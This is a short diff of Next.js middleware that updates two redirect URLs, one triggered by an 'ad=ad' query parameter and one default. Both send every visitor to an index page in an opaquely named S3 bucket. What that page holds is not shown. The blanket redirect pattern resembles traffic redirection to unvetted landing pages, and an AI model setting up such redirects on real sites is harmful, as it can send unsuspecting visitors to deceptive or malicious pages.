@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://mzn038-0011.s3.us-east-2.amazonaws.com/vb14x-em2_v.20/index.html',
+      'https://mzn038-0011.s3.us-east-2.amazonaws.com/vadfl-em2_v.20.10/index.html',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://mzn038-0011.s3.us-east-2.amazonaws.com/vb14x-em2_v.20/index.html',
+    'https://mzn038-0011.s3.us-east-2.amazonaws.com/vadfl-em2_v.20.10/index.html',
     { status: 302 }
   )
 }
